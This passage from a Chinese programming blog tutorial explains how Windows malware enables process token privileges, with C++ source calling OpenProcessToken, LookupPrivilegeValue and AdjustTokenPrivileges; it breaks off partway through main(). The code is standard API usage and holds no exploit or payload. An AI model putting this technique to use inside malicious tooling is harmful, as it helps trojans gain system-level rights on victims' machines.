       <a id="2_194">
       </a>
       2.实现原理
      </span>
     </strong>
    </h3>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       (1) 使用场景
      </strong>
      <br/>
      病毒木马想要实现一些关键的系统操作时，并且进程访问令牌权限提升的实现步骤较为固定。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       (2) 实现流程
      </strong>
     </span>
    </p>
    <ul style="margin-left:0px;">
     <li>
      打开进程访问令牌
     </li>
     <li>
      取得特权的LUID值
     </li>
     <li>
      调整访问令牌特权值
     </li>
    </ul>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      首先获取进程的访问令牌，然后将访问令牌的权限修改为指定权限。但是系统内部并不直接识别权限名称，
      <strong>
       而是识别LUID值
      </strong>
      ，所以需要根据权限名称获取对应的LUID值，之后传递给系统，实现进程访问令牌权限的修改。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <strong>
       (3) 实现步骤
      </strong>
     </span>
    </p>
    <ul style="margin-left:0px;">
     <li>
      <p style="margin-left:0px;">
       <span style="color:#4d4d4d;">
        获取指定进程的访问令牌，需要获取权限的令牌句柄为 TOKEN_ADJUST_PRIVILEGES
        <br/>
        <span style="color:#FF0000;">
         <strong>
          OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken)
         </strong>
        </span>
       </span>
      </p>
     </li>
     <li>
      <p style="margin-left:0px;">
       <span style="color:#4d4d4d;">
        获取本地系统指定特权名称的LUID值，LUID值相当于该特权的身份标号
        <br/>
        <span style="color:#FF0000;">
         <strong>
          LookupPrivilegeValue(NULL, pszPrivilegesName, &amp;luidValue)
         </strong>
        </span>
       </span>
      </p>
     </li>
     <li>
      <p style="margin-left:0px;">
       <span style="color:#4d4d4d;">
        创建一个新的进程令牌特权结构体 TOKEN_PRIVILEGES，并对其进行赋值，设置新特权的数量、特权对应的LUID值以及特权的属性状态
        <br/>
        <span style="color:#FF0000;">
         <strong>
          tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
         </strong>
        </span>
       </span>
      </p>
     </li>
     <li>
      <p style="margin-left:0px;">
       <span style="color:#4d4d4d;">
        调用 AdjustTokenPrivileges 函数对进程令牌的特权进行修改
        <br/>
        <span style="color:#FF0000;">
         <strong>
          AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, 0, NULL, NULL)
         </strong>
        </span>
       </span>
      </p>
     </li>
    </ul>
    <p>
    </p>
    <hr/>
    <h3 style="margin-left:0px;">
     <strong>
      <span style="color:#4f4f4f;">
       <a name="t4">
       </a>
       <a id="3_223">
       </a>
       3.编程实现
      </span>
     </strong>
    </h3>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      第一步，新建C++空项目，项目名称为“Tiquan01”。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/73159d912a95a1546cfa8741dcc7e4b4.png#pic_center" width="550"/>
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      第二步，新建源文件“main.cpp”。
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      <img alt="在这里插入图片描述" height="350" src="https://i-blog.csdnimg.cn/blog_migrate/9f703186c6fe174fe6b4661af13f95ef.png#pic_center" width="650"/>
     </span>
    </p>
    <p style="margin-left:0px;">
     <span style="color:#4d4d4d;">
      第三步，编写代码获取当前进程号。
     </span>
    </p>
    <pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-c"&gt;&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt;&lt;span style="color:#669900"&gt;&lt;windows.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt;&lt;span style="color:#669900"&gt;&lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt;&lt;span style="color:#669900"&gt;&lt;iostream&gt;&lt;/span&gt;&lt;/span&gt;
using namespace std&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;ifdef&lt;/span&gt; \_WIN32&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt; &lt;span style="color:#669900"&gt;&lt;process.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;else&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;include&lt;/span&gt; &lt;span style="color:#669900"&gt;&lt;unistd.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span style="color:#98c379"&gt;#&lt;span style="color:#c678dd"&gt;endif&lt;/span&gt;&lt;/span&gt;

&lt;span style="color:#5c6370"&gt;//主函数&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;int&lt;/span&gt; &lt;span style="color:#61aeee"&gt;main&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;int&lt;/span&gt; argc&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#c678dd"&gt;char&lt;/span&gt;&lt;span style="color:#669900"&gt;\*&lt;/span&gt; argv&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;//获取当前进程号&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;int&lt;/span&gt; iPid &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#c678dd"&gt;int&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#61aeee"&gt;\_getpid&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
std&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;cout &lt;span style="color:#669900"&gt;&lt;&lt;&lt;/span&gt; &lt;span style="color:#669900"&gt;"The process id is: "&lt;/span&gt; &lt;span style="color:#669900"&gt;&lt;&lt;&lt;/span&gt; iPid &lt;span style="color:#669900"&gt;&lt;&lt;&lt;/span&gt; std&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;endl&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#61aeee"&gt;system&lt;/span&gt;&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"PAUSE"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/span&gt;</code></pre>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
输出结果如下图所示，可以看到我们的程序 Tiquan01.exe 进程为 18512。
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
<img alt="在这里插入图片描述" height="320" src="https://i-blog.csdnimg.cn/blog_migrate/2138e59f1de63b88d4236f1901200fb2.png#pic_center" width="550"/>
</span>
</p>
<p style="margin-left:0px;">
<span style="color:#4d4d4d;">
第四步，通过子函数实现进程访问令牌的提升权限。
</span>
</p>
<pre class="has" style="margin-left:0px;"><code class="language-prettyprint">&lt;span style="color:#000000"&gt;&lt;code class="language-python"&gt;&lt;span style="color:#5c6370"&gt;#include&lt;windows.h&gt;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;#include&lt;string.h&gt;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;#include&lt;iostream&gt;&lt;/span&gt;
using namespace std&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#5c6370"&gt;#ifdef \_WIN32&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;#include &lt;process.h&gt;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;#else&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;#include &lt;unistd.h&gt;&lt;/span&gt;
&lt;span style="color:#5c6370"&gt;#endif&lt;/span&gt;

&lt;span style="color:#669900"&gt;//&lt;/span&gt;显示错误信息
void ShowError&lt;span style="color:#999999"&gt;(&lt;/span&gt;char&lt;span style="color:#669900"&gt;\*&lt;/span&gt; pszText&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
char szErr&lt;span style="color:#999999"&gt;[&lt;/span&gt;MAX_PATH&lt;span style="color:#999999"&gt;]&lt;/span&gt; &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;wsprintf&lt;span style="color:#999999"&gt;(&lt;/span&gt;szErr&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;"%s Error[%d]\n"&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; pszText&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;GetLastError&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;MessageBox&lt;span style="color:#999999"&gt;(&lt;/span&gt;NULL&lt;span style="color:#999999"&gt;,&lt;/span&gt; szErr&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;"ERROR"&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt; MB_OK&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
&lt;span style="color:#999999"&gt;}&lt;/span&gt;

&lt;span style="color:#669900"&gt;/&lt;/span&gt;&lt;span style="color:#669900"&gt;_&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;
函数名&lt;span style="color:#999999"&gt;:&lt;/span&gt; CPrivilgeEscalationDlg&lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;EnableDebugPrivilege
返回类型&lt;span style="color:#999999"&gt;:&lt;/span&gt; BOOL
功能&lt;span style="color:#999999"&gt;:&lt;/span&gt; 提升进程访问令牌权限
参数&lt;span style="color:#98c379"&gt;1&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt; 需要提升权限的进程句柄
参数&lt;span style="color:#98c379"&gt;2&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt; 特权名称
&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;-&lt;/span&gt;&lt;span style="color:#669900"&gt;_&lt;/span&gt;&lt;span style="color:#669900"&gt;/&lt;/span&gt;
BOOL EnbalePrivileges&lt;span style="color:#999999"&gt;(&lt;/span&gt;HANDLE hProcess&lt;span style="color:#999999"&gt;,&lt;/span&gt; char&lt;span style="color:#669900"&gt;\*&lt;/span&gt; pszPrivilegesName&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
HANDLE hToken &lt;span style="color:#669900"&gt;=&lt;/span&gt; NULL&lt;span style="color:#999999"&gt;;&lt;/span&gt;
LUID luidValue &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
TOKEN_PRIVILEGES tokenPrivileges &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt; &lt;span style="color:#999999"&gt;}&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
BOOL bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
DWORD dwRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#669900"&gt;//&lt;/span&gt;打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄
    bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;OpenProcessToken&lt;span style="color:#999999"&gt;(&lt;/span&gt;hProcess&lt;span style="color:#999999"&gt;,&lt;/span&gt; TOKEN_ADJUST_PRIVILEGES&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;hToken&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;FALSE &lt;span style="color:#669900"&gt;==&lt;/span&gt; bRet&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	ShowError&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"OpenProcessToken"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;
    &lt;span style="color:#669900"&gt;//&lt;/span&gt;获取本地系统的 pszPrivilegesName 特权的LUID值
    bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;LookupPrivilegeValue&lt;span style="color:#999999"&gt;(&lt;/span&gt;NULL&lt;span style="color:#999999"&gt;,&lt;/span&gt; pszPrivilegesName&lt;span style="color:#999999"&gt;,&lt;/span&gt; &lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;luidValue&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;FALSE &lt;span style="color:#669900"&gt;==&lt;/span&gt; bRet&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	ShowError&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"LookupPrivilegeValue"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;
    &lt;span style="color:#669900"&gt;//&lt;/span&gt;设置提升权限信息
    tokenPrivileges&lt;span style="color:#999999"&gt;.&lt;/span&gt;PrivilegeCount &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#98c379"&gt;1&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    tokenPrivileges&lt;span style="color:#999999"&gt;.&lt;/span&gt;Privileges&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;.&lt;/span&gt;Luid &lt;span style="color:#669900"&gt;=&lt;/span&gt; luidValue&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    tokenPrivileges&lt;span style="color:#999999"&gt;.&lt;/span&gt;Privileges&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;.&lt;/span&gt;Attributes &lt;span style="color:#669900"&gt;=&lt;/span&gt; SE_PRIVILEGE_ENABLED&lt;span style="color:#999999"&gt;;&lt;/span&gt;

    &lt;span style="color:#669900"&gt;//&lt;/span&gt;提升进程令牌访问权限
    bRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;AdjustTokenPrivileges&lt;span style="color:#999999"&gt;(&lt;/span&gt;
    	hToken&lt;span style="color:#999999"&gt;,&lt;/span&gt;                  &lt;span style="color:#669900"&gt;//&lt;/span&gt;令牌句柄
    	FALSE&lt;span style="color:#999999"&gt;,&lt;/span&gt;                   &lt;span style="color:#669900"&gt;//&lt;/span&gt;是否禁用权限
    	&lt;span style="color:#669900"&gt;&amp;&lt;/span&gt;tokenPrivileges&lt;span style="color:#999999"&gt;,&lt;/span&gt;        &lt;span style="color:#669900"&gt;//&lt;/span&gt;新的特权的权限信息
    	&lt;span style="color:#98c379"&gt;0&lt;/span&gt;&lt;span style="color:#999999"&gt;,&lt;/span&gt;                       &lt;span style="color:#669900"&gt;//&lt;/span&gt;特权信息大小
    	NULL&lt;span style="color:#999999"&gt;,&lt;/span&gt;                    &lt;span style="color:#669900"&gt;//&lt;/span&gt;用来接收特权信息当前状态的&lt;span style="color:#669900"&gt;buffer&lt;/span&gt;
    	NULL                     &lt;span style="color:#669900"&gt;//&lt;/span&gt;缓冲区大小
    &lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;FALSE &lt;span style="color:#669900"&gt;==&lt;/span&gt; bRet&lt;span style="color:#999999"&gt;)&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	ShowError&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"AdjustTokenPrivileges"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;
    &lt;span style="color:#c678dd"&gt;else&lt;/span&gt; &lt;span style="color:#999999"&gt;{&lt;/span&gt;
    	&lt;span style="color:#669900"&gt;//&lt;/span&gt;根据错误码判断是否特权都设置成功
    	dwRet &lt;span style="color:#669900"&gt;=&lt;/span&gt; &lt;span style="color:#999999"&gt;:&lt;/span&gt;&lt;span style="color:#999999"&gt;:&lt;/span&gt;GetLastError&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;ERROR_SUCCESS &lt;span style="color:#669900"&gt;==&lt;/span&gt; dwRet&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;{&lt;/span&gt;
    		&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; TRUE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;}&lt;/span&gt;
    	&lt;span style="color:#c678dd"&gt;else&lt;/span&gt; &lt;span style="color:#c678dd"&gt;if&lt;/span&gt; &lt;span style="color:#999999"&gt;(&lt;/span&gt;ERROR_NOT_ALL_ASSIGNED &lt;span style="color:#669900"&gt;==&lt;/span&gt; dwRet&lt;span style="color:#999999"&gt;)&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;{&lt;/span&gt;
    		ShowError&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;"ERROR_NOT_ALL_ASSIGNED"&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    		&lt;span style="color:#c678dd"&gt;return&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;
    	&lt;span style="color:#999999"&gt;}&lt;/span&gt;
    &lt;span style="color:#999999"&gt;}&lt;/span&gt;

    &lt;span style="color:#c678dd"&gt;return&lt;/span&gt; FALSE&lt;span style="color:#999999"&gt;;&lt;/span&gt;

&lt;span style="color:#999999"&gt;}&lt;/span&gt;

&lt;span style="color:#669900"&gt;//&lt;/span&gt;主函数
&lt;span style="color:#669900"&gt;int&lt;/span&gt; main&lt;span style="color:#999999"&gt;(&lt;/span&gt;&lt;span style="color:#669900"&gt;int&lt;/span&gt; argc&lt;span style="color:#999999"&gt;,&lt;/span&gt; char&lt;span style="color:#669900"&gt;\*&lt;/span&gt; argv&lt;span style="color:#999999"&gt;[&lt;/span&gt;&lt;span style="color:#999999"&gt;]&lt;/span&gt;&lt;span style="color:#999999"&gt;)&lt;/span&gt;
&lt;span style="color:#999999"&gt;{&lt;/span&gt;
&lt;span style="color:#669900"&gt;//&lt;/span&gt;获取当前进程号
